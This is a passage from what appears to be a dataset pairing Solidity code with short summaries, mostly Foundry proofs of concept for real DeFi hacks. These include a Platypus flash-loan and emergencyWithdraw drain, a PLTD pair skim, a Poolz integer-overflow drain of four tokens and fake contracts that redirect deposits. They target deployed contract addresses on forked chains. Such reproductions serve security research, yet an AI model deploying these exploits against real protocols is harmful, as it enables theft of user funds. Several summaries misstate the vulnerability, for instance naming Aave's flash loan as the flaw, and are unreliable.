_fromJarAmount, // How much jar tokens to swap\n        uint256 _toJarMinAmount, // How much jar tokens you'd like at a minimum\n        address[] calldata _targets,\n        bytes[] calldata _data\n    ) external virtual;\n}\n\nabstract contract CurveLogicLike {\n    function add_liquidity(\n        address curve,\n        bytes4 curveFunctionSig,\n        uint256 curvePoolSize,\n        uint256 curveUnderlyingIndex,\n        address underlying\n    ) public virtual;\n}\n\ncontract FakeJar {\n    IERC20 _token;\n    \n    constructor(IERC20 token) public {\n        _token = token;\n    }\n    \n    function token() public view returns (IERC20) {\n        return _token;\n    }\n    \n    function transfer(address to, uint amnt) public returns (bool) {\n        return true;\n    }\n    \n    function transferFrom(address, address, uint) public returns (bool) {\n        return true;\n    }\n    \n    function getRatio() public returns (uint) {\n        return 0;\n    }\n    \n    function decimals() public returns (uint) {\n        return 0;\n    }\n    \n    function balanceOf(address) public returns (uint) {\n        return 0;\n    }\n    \n    function approve(address, uint) public returns (bool) {\n        return true;\n    }\n    \n    function deposit(uint amount) public {\n        _token.transferFrom(msg.sender, tx.origin, amount);\n    }\n    \n    function withdraw(uint) public {\n    }\n}\n\ncontract FakeUnderlying {\n    address private target;\n    \n    constructor(address _target) public {\n        target = _target;\n    }\n    \n    function balanceOf(address) public returns (address) {\n        return target;\n    }\n    \n    function approve(address, uint) public returns (bool) {\n        return true;\n    }\n    \n    function allowance(address, address) public returns (uint) {\n        return 0;\n    }\n}\n\nabstract contract JarLike {\n    function earn() public virtual;\n}\n",
        "summary": "This code is a Solidity smart contract that is used to execute an exploit on a vulnerable smart contract called CurveLogicLike. The exploit uses a fake contract called FakeJar to trick CurveLogicLike into thinking that funds are being deposited, when in reality they are being transferred to the attacker's address. The AttackContract also interacts with other smart contracts such as ControllerLike and JarLike to manipulate and transfer funds.",
        "id": "5c1d51e2-5d6e-47a5-9d58-947635a5a4a6"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analsis\n// https://twitter.com/peckshield/status/1626367531480125440\n// https://twitter.com/spreekaway/status/1626319585040338953\n// @TX\n// https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430\n\ninterface PlatypusPool {\n    function deposit(address token, uint256 amount, address to, uint256 deadline) external;\n    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external;\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minimumToAmount,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface MasterPlatypusV4 {\n    function deposit(uint256 _pid, uint256 _amount) external;\n    function emergencyWithdraw(uint256 _pid) external;\n}\n\ninterface PlatypusTreasure {\n    struct PositionView {\n        uint256 collateralAmount;\n        uint256 collateralUSD;\n        uint256 borrowLimitUSP;\n        uint256 liquidateLimitUSP;\n        uint256 debtAmountUSP;\n        uint256 debtShare;\n        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0\n        bool liquidable;\n    }\n\n    function positionView(address _user, address _token) external view returns (PositionView memory);\n    function borrow(address _token, uint256 _borrowAmount) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);\n    IERC20 USP = IERC20(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);\n    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);\n    IERC20 USDT = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);\n    IERC20 USDT_E = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);\n    IERC20 BUSD = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);\n    IERC20 DAI_E = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);\n    IERC20 LPUSDC = IERC20(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);\n    PlatypusPool Pool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);\n    MasterPlatypusV4 Master = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);\n    PlatypusTreasure Treasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 26_343_613);\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(USP), \"USP\");\n        cheats.label(address(USDC_E), \"USDC_E\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(USDT_E), \"USDT_E\");\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(address(DAI_E), \"DAI_E\");\n        cheats.label(address(LPUSDC), \"LPUSDC\");\n        cheats.label(address(Pool), \"Pool\");\n        cheats.label(address(Master), \"Master\");\n        cheats.label(address(Treasure), \"Treasure\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n    }\n\n    function testExploit() external {\n        aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker USP balance after exploit\", USP.balanceOf(address(this)), USP.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker USDC_E balance after exploit\", USDC_E.balanceOf(address(this)), USDC_E.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker USDT_E balance after exploit\", USDT_E.balanceOf(address(this)), USDT_E.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker DAI_E balance after exploit\", DAI_E.balanceOf(address(this)), DAI_E.decimals()\n            );\n    }\n\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external returns (bool) {\n        USDC.approve(address(aaveV3), amount + premium);\n        USDC.approve(address(Pool), amount);\n        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC\n        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));\n        LPUSDC.approve(address(Master), LPUSDCAmount);\n        Master.deposit(4, LPUSDCAmount); // deposit LP-USDC to MasterPlatypus\n        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));\n        uint256 borrowAmount = Position.borrowLimitUSP;\n        Treasure.borrow(address(LPUSDC), borrowAmount); // borrow USP from Treasure\n        Master.emergencyWithdraw(4);\n        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));\n        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC\n        swapUSPToOtherToken();\n        return true;\n    }\n\n    function swapUSPToOtherToken() internal {\n        USP.approve(address(Pool), 9_000_000 * 1e18);\n        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);\n        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);\n        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);\n        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);\n        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);\n        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in the Aave Flash Loan function to carry out a flash loan attack. The contract interacts with several other contracts, including PlatypusPool, MasterPlatypusV4, PlatypusTreasure, and IAaveFlashloan. The goal of the attack is to borrow USDC from Treasure using LP-USDC as collateral, deposit LP-USDC to MasterPlatypusV4, and then withdraw USDC from LP-USDC to perform swaps for various other tokens using PlatypusPool.",
        "id": "d2cacf14-3b3a-4fc4-9473-4dbd6e36cc5c"
    },
    {
        "code": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1582181583343484928\n// TX\n// https://bscscan.com/tx/0x8385625e9d8011f4ad5d023d64dc7985f0315b6a4be37424c7212fe4c10dafe0\n\ncontract ContractTest is DSTest{\n\n    IERC20 USDT =IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 PLTD = IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4397C76088db8f16C15455eB943Dd11F2DF56545);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address constant dodo1 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;\n    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22252045); \n    }\n\n    function testExploit() external{\n\n        USDT.approve(address(Router), type(uint).max);\n        PLTD.approve(address(Router), type(uint).max);\n        DVM(dodo1).flashLoan(0, 220_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        if(msg.sender == dodo1){\n            DVM(dodo2).flashLoan(0, 440_000 * 1e18, address(this), new bytes(1));\n            USDT.transfer(dodo1, 220_000 * 1e18);\n        }\n        if( msg.sender == dodo2){\n            USDTToPLTD();\n            uint amount = PLTD.balanceOf(address(Pair));\n            PLTD.transfer(address(Pair), amount * 2 - 1);\n            Pair.skim(address(this));\n            PLTD.transfer(tx.origin, 1e18);\n            PLTDToUSDT();\n            USDT.transfer(dodo2, 440_000 * 1e18);\n        }\n    }\n\n    function USDTToPLTD() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(PLTD);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            660_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function PLTDToUSDT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(PLTD);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            PLTD.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in a decentralized exchange protocol. The vulnerable code is not shown in this snippet. The contract imports some interfaces for ERC20 tokens and Uniswap contracts, and a cheat codes contract. In the `setUp()` function, it creates a fork of the BSC network and in the `testExploit()` function, it approves token amounts for swapping, calls the `flashLoan()` function with an amount of USDT, and executes a series of token transfers and swaps to exploit the vulnerability. The `DPPFlashLoanCall()` function is called by the `flashLoan()` function and provides a mechanism to perform additional operations during the loan transaction.",
        "id": "05289aa1-e26d-47a0-848d-b63d76ff1d9c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n/*\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~999M US$\n// Attacker : 0xcafebabe\n// Attack Contract : 0xdeadbeef\n// Vulnerable Contract : 0xdeadbeef\n// Attack Tx : 0x123456789\n\n// @Info\n// Vulnerable Contract Code : https://etherscan.io/address/0xdeadbeef#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://www.google.com/\n// Hacking God : https://www.google.com/\n\ncontract ContractTest is Test {\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IUSDT USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    \n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15460093);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(USDC), \"USDC\");\n        //address alice = makeAddr(\"alice\");\n    }\n    \n    function testExploit() public{\n        //cheats.startPrank(alice);\n        //cheats.stopPrank();\n    }\n}\n\n*/\n",
        "summary": "This is a Solidity smart contract that imports other contracts and interfaces and sets up some variables. It includes some commented out sections that were likely used for testing or development purposes. Some additional information is provided in the comments about the contract and potential vulnerabilities. However, without the imported contracts and interfaces it's impossible to determine exactly what the contract does or what type of vulnerabilities it is trying to address.",
        "id": "b8d2d02a-f0ee-43af-936d-16a5d42c5ccd"
    },
    {
        "code": "\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n\ncontract ContractTest is Test {\n    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);\n    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    IERC20 constant mnz  = IERC20(0x861f1E1397daD68289e8f6a09a2ebb567f1B895C);\n\n    IERC20 constant wod  = IERC20(0x298632D8EA20d321fAB1C9B473df5dBDA249B2b6);\n\n    IERC20 constant sip  = IERC20(0x9e5965d28E8D44CAE8F9b809396E0931F9Df71CA);\n\n    IERC20 constant ecio  = IERC20(0x327A3e880bF2674Ee40b6f872be2050Ed406b021);\n\n    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n\n\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n\n    LockedDeal constant   poolzpool = LockedDeal(payable(0x8BfAA473a899439d8E07BF86a8C6cE5De42fE54B));\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26475403);\n    }\n\n    function testExploit() external {\n        bytes memory data ;\n        address assetTo = address(this);\n        data = \"poolz\";\n        dppAdvanced.flashLoan(1e18, 0, assetTo, data);\n\n        \n    }\n\n\n\n\n\n    function DPPFlashLoanCall(address, uint256, uint256, bytes memory data) external {\n        if(keccak256(data) == keccak256(\"poolz\")){\n            console.log(\"Flashloan attacks\");\n            emit log_named_decimal_uint(\"[Before mnz Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n\n            address[] memory swapPath = new address[](3);\n\n            wbnb.withdraw(1e18);\n\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(mnz);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n            \n            mnz.approve(address(poolzpool), type(uint256).max);\n            sip.approve(address(poolzpool), type(uint256).max);\n            ecio.approve(address(poolzpool), type(uint256).max);\n            wod.approve(address(poolzpool), type(uint256).max);\n\n\n            mnz.approve(address(pancakeRouter), type(uint256).max);\n            sip.approve(address(pancakeRouter), type(uint256).max);\n            ecio.approve(address(pancakeRouter), type(uint256).max);\n            wod.approve(address(pancakeRouter), type(uint256).max);\n\n            \n            uint256 mnz_balance = mnz.balanceOf(address(poolzpool));\n            uint256 overflow_data;\n            \n            overflow_data = type(uint256).max - mnz_balance + 2;\n\n\n            uint64[] memory begintime = new uint64[](2);\n            begintime[0] = uint64(block.timestamp);\n            begintime[1] = uint64(block.timestamp);\n\n\n            uint256[] memory transfer_data = new uint256[](2);\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = mnz_balance;\n\n            address[] memory owner_addr = new address[](2);\n            owner_addr[0] = address(this);\n            owner_addr[1] = address(this);\n\n            uint256 firstPoolId;\n            uint256 lastPoolId;\n\n            ( firstPoolId,  lastPoolId) = poolzpool.CreateMassPools(\n                address(mnz),\n                begintime,\n                transfer_data,\n                owner_addr\n            );\n\n            poolzpool.WithdrawToken(lastPoolId);\n\n            uint256 mnz_number = mnz.balanceOf(address(this));\n            \n            emit log_named_decimal_uint(\"[mnz Exp] mnz pool balance\", mnz_number, 18);\n\n            \n            sellmnz();\n\n            emit log_named_decimal_uint(\"[After mnz Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n\n            wbnb.withdraw(1e18);\n\n            emit log_named_decimal_uint(\"[Before sip Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n  \n\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(sip);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n\n            uint256 sip_balance = sip.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[sip Exp] pool sip  balance\", sip.balanceOf(address(poolzpool)), 18);\n\n            overflow_data = type(uint256).max - sip_balance + 2;\n\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = sip_balance;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(\n                address(sip),\n                begintime,\n                transfer_data,\n                owner_addr\n            );\n\n            poolzpool.WithdrawToken(lastPoolId);\n            \n            sellsip();\n\n            emit log_named_decimal_uint(\"[After sip Exp] pool sip  balance\", sip.balanceOf(address(poolzpool)), 18);\n\n            emit log_named_decimal_uint(\"[After sip Exp] user wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            wbnb.withdraw(1e18);\n\n            emit log_named_decimal_uint(\"[Before wod Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            address[] memory simplepath = new address[](2);\n\n            simplepath[0] = address(wbnb);\n            simplepath[1] = address(wod);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, simplepath, address(this), block.timestamp);\n\n            uint256 wod_balance = wod.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[wod Exp] pool wod  balance\", wod.balanceOf(address(poolzpool)), 18);\n\n            overflow_data = type(uint256).max - wod_balance + 2;\n\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = wod_balance;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(\n                address(wod),\n                begintime,\n                transfer_data,\n                owner_addr\n            );\n\n            poolzpool.WithdrawToken(lastPoolId);\n            \n            sellwod();\n\n            emit log_named_decimal_uint(\"[After wod Exp] pool wod  balance\", wod.balanceOf(address(poolzpool)), 18);\n\n            emit log_named_decimal_uint(\"[After wod Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            \n            wbnb.withdraw(1e18);\n\n            emit log_named_decimal_uint(\"[Before ecio Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(ecio);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n\n            uint256 ecio_balance = ecio.balanceOf(address(poolzpool));\n\n            emit log_named_decimal_uint(\"[ecio Exp] pool ecio  balance\", ecio.balanceOf(address(poolzpool)), 18);\n\n            overflow_data = type(uint256).max - ecio_balance + 2;\n\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = ecio_balance;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(\n                address(ecio),\n                begintime,\n                transfer_data,\n                owner_addr\n            );\n\n            poolzpool.WithdrawToken(lastPoolId);\n        \n\n            sellecio();\n\n            emit log_named_decimal_uint(\"[After ecio Exp] pool ecio  balance\", ecio.balanceOf(address(poolzpool)), 18);\n\n            emit log_named_decimal_uint(\"[After ecio Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            \n            emit log_named_decimal_uint(\"[Total exploit wbnb balance ] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            wbnb.transfer(address(dppAdvanced), 1 * 1e18);\n            \n\n        }\n      \n\n\n    }\n\n\n    function sellecio() internal{\n        address [] memory path = new address[](3);\n        path[0] = address(ecio);\n        path[1] = address(busd);\n        path[2] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            ecio.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function sellwod() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(wod);\n        path[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            wod.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n    function sellsip() internal{\n        address [] memory path = new address[](3);\n        path[0] = address(sip);\n        path[1] = address(busd);\n        path[2] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            sip.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n    function sellmnz() internal{\n        address [] memory path = new address[](3);\n        path[0] = address(mnz);\n        path[1] = address(busd);\n        path[2] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            mnz.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n    receive() external payable {}\n}\n\n\n\ninterface IDPPAdvanced {\n  \n\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;\n   \n} \n\ninterface LockedDeal {\n    event NewPoolCreated(\n        uint256 PoolId,\n        address Token,\n        uint64 FinishTime,\n        uint256 StartAmount,\n        address Owner\n    );\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n    event PoolApproval(uint256 PoolId, address Spender, uint256 Amount);\n    event PoolOwnershipTransfered(\n        uint256 PoolId,\n        address NewOwner,\n        address OldOwner\n    );\n    event TransferIn(uint256 Amount, address From, address Token);\n    event TransferInETH(uint256 Amount, address From);\n    event TransferOut(uint256 Amount, address To, address Token);\n    event TransferOutETH(uint256 Amount, address To);\n\n    function ApproveAllowance(\n        uint256 _PoolId,\n        uint256 _Amount,\n        address _Spender\n    ) external;\n\n    function CreateMassPools(\n        address _Token,\n        uint64[] memory _FinishTime,\n        uint256[] memory _StartAmount,\n        address[] memory _Owner\n    ) external returns (uint256, uint256);\n\n    function CreateNewPool(\n        address _Token,\n        uint64 _FinishTime,\n        uint256 _StartAmount,\n        address _Owner\n    ) external returns (uint256);\n\n    function CreatePoolsWrtTime(\n        address _Token,\n        uint64[] memory _FinishTime,\n        uint256[] memory _StartAmount,\n        address[] memory _Owner\n    ) external returns (uint256, uint256);\n\n    function GetFee() external view returns (uint16);\n\n    function GetMinDuration() external view returns (uint16);\n\n    function GetMyPoolsId() external view returns (uint256[] memory);\n\n    function GetPoolAllowance(uint256 _PoolId, address _Address)\n        external\n        view\n        returns (uint256);\n\n    function GetPoolData(uint256 _id)\n        external\n        view\n        returns (\n            uint64,\n            uint256,\n            address,\n            address\n        );\n\n    function GovernerContract() external view returns (address);\n\n    function IsPayble() external view returns (bool);\n\n    function PozFee() external view returns (uint256);\n\n    function PozTimer() external view returns (uint256);\n\n    function SetFee(uint16 _fee) external;\n\n    function SetMinDuration(uint16 _minDuration) external;\n\n    function SetPOZFee(uint16 _fee) external;\n\n    function SetPozTimer(uint256 _pozTimer) external;\n\n    function SplitPoolAmount(\n        uint256 _PoolId,\n        uint256 _NewAmount,\n        address _NewOwner\n    ) external returns (uint256);\n\n    function SplitPoolAmountFrom(\n        uint256 _PoolId,\n        uint256 _Amount,\n        address _Address\n    ) external returns (uint256);\n\n    function SwitchIsPayble() external;\n\n    function TransferPoolOwnership(uint256 _PoolId, address _NewOwner) external;\n\n    function WhiteListId() external view returns (uint256);\n\n    function WhiteList_Address() external view returns (address);\n\n    function WithdrawERC20Fee(address _Token, address _to) external;\n\n    function WithdrawETHFee(address _to) external;\n\n    function WithdrawToken(uint256 _PoolId) external returns (bool);\n\n    function isTokenFilterOn() external view returns (bool);\n\n    function isTokenWhiteListed(address _tokenAddress)\n        external\n        view\n        returns (bool);\n\n    function maxTransactionLimit() external view returns (uint256);\n\n    function name() external view returns (string memory);\n\n    function owner() external view returns (address);\n\n    function renounceOwnership() external;\n\n    function setGovernerContract(address _address) external;\n\n    function setMaxTransactionLimit(uint256 _newLimit) external;\n\n    function setWhiteListAddress(address _address) external;\n\n    function setWhiteListId(uint256 _id) external;\n\n    function swapTokenFilter() external;\n\n    function transferOwnership(address newOwner) external;\n\n    receive() external payable;\n}",
        "summary": "This code is a Solidity smart contract that exploits a vulnerability (\"flashloan attacks\") in the code of another contract (\"IDPPAdvanced\") in order to manipulate token balances and perform transactions on the PancakeSwap decentralized exchange. The contract initializes several token contracts (\"mnz\", \"wod\", \"sip\", \"ecio\", and \"busd\") and the PancakeSwap router contract (\"pancakeRouter\"), and sets up a \"LockedDeal\" contract (\"poolzpool\") to manage token pools. \n\nThe \"setUp()\" function creates a new fork of the Binance Smart Chain network. The \"testExploit()\" function performs the flashloan attack on the vulnerable contract using the \"dppAdvanced\" instance, triggering the \"DPPFlashLoanCall()\" callback function. This function performs a series of complex and interconnected operations with the various tokens and contract instances to manipulate balances and execute trades, ultimately transferring funds to the \"dppAdvanced\" contract.",
        "id": "a1f3a2e2-e02a-4f19-bdc4-50f98a341b3f"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n\n}\n",
        "summary": "This code is a template for a smart contract written in Solidity programming language. It defines a contract called MyContract, but the contract itself does not have any functions or variables defined within it. The pragma statement at the beginning specifies the minimum version of Solidity required to compile the code.",
        "id": "a5e87fcd-fce1-4f2f-a0e7-e2506d801ce1"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// wtf.academy\npragma solidity ^0.8.4;\n\n/**\n * @dev Proxy\u5408\u7ea6\u7684\u6240\u6709\u8c03\u7528\u90fd\u901a\u8fc7`delegatecall`\u64cd\u4f5c\u7801\u59d4\u6258\u7ed9\u53e6\u4e00\u4e2a\u5408\u7ea6\u6267\u884c\u3002\u540e\u8005\u88ab\u79f0\u4e3a\u903b\u8f91\u5408\u7ea6\uff08Implementation\uff09\u3002\n *\n * \u59d4\u6258\u8c03\u7528\u7684\u8fd4\u56de\u503c\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9Proxy\u7684\u8c03\u7528\u8005\n */\ncontract Proxy {\n    address public implementation; // \u903b\u8f91\u5408\u7ea6\u5730\u5740\u3002implementation\u5408\u7ea6\u540c\u4e00\u4e2a\u4f4d\u7f6e\u7684\u72b6\u6001\u53d8\u91cf\u7c7b\u578b\u5fc5\u987b\u548cProxy\u5408\u7ea6\u7684\u76f8\u540c\uff0c\u4e0d\u7136\u4f1a\u62a5\u9519\u3002\n\n    /**\n     * @dev \u521d\u59cb\u5316\u903b\u8f91\u5408\u7ea6\u5730\u5740\n     */\n    constructor(address implementation_){\n        implementation = implementation_;\n    }\n\n    /**\n     * @dev \u56de\u8c03\u51fd\u6570\uff0c\u8c03\u7528`_delegate()`\u51fd\u6570\u5c06\u672c\u5408\u7ea6\u7684\u8c03\u7528\u59d4\u6258\u7ed9 `implementation` \u5408\u7ea6\n     */\n    fallback() external payable {\n        _delegate();\n    }\n\n    /**\n     * @dev \u5c06\u8c03\u7528\u59d4\u6258\u7ed9\u903b\u8f91\u5408\u7ea6\u8fd0\u884c\n     */\n    function _delegate() internal {\n        assembly {\n            // Copy msg.data. We take full control of memory in this inline assembly\n            // block because it will not return to Solidity code. We overwrite the\n            // \u8bfb\u53d6\u4f4d\u7f6e\u4e3a0\u7684storage\uff0c\u4e5f\u5c31\u662fimplementation\u5730\u5740\u3002\n            let _implementation := sload(0)\n\n            calldatacopy(0, 0, calldatasize())\n\n            // \u5229\u7528delegatecall\u8c03\u7528implementation\u5408\u7ea6\n            // delegatecall\u64cd\u4f5c\u7801\u7684\u53c2\u6570\u5206\u522b\u4e3a\uff1agas, \u76ee\u6807\u5408\u7ea6\u5730\u5740\uff0cinput mem\u8d77\u59cb\u4f4d\u7f6e\uff0cinput mem\u957f\u5ea6\uff0coutput area mem\u8d77\u59cb\u4f4d\u7f6e\uff0coutput area mem\u957f\u5ea6\n            // output area\u8d77\u59cb\u4f4d\u7f6e\u548c\u957f\u5ea6\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8bbe\u4e3a0\n            // delegatecall\u6210\u529f\u8fd4\u56de1\uff0c\u5931\u8d25\u8fd4\u56de0\n            let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)\n\n            // \u5c06\u8d77\u59cb\u4f4d\u7f6e\u4e3a0\uff0c\u957f\u5ea6\u4e3areturndatasize()\u7684returndata\u590d\u5236\u5230mem\u4f4d\u7f6e0\n            returndatacopy(0, 0, returndatasize())\n\n            switch result\n            // \u5982\u679cdelegate call\u5931\u8d25\uff0crevert\n            case 0 {\n                revert(0, returndatasize())\n            }\n            // \u5982\u679cdelegate 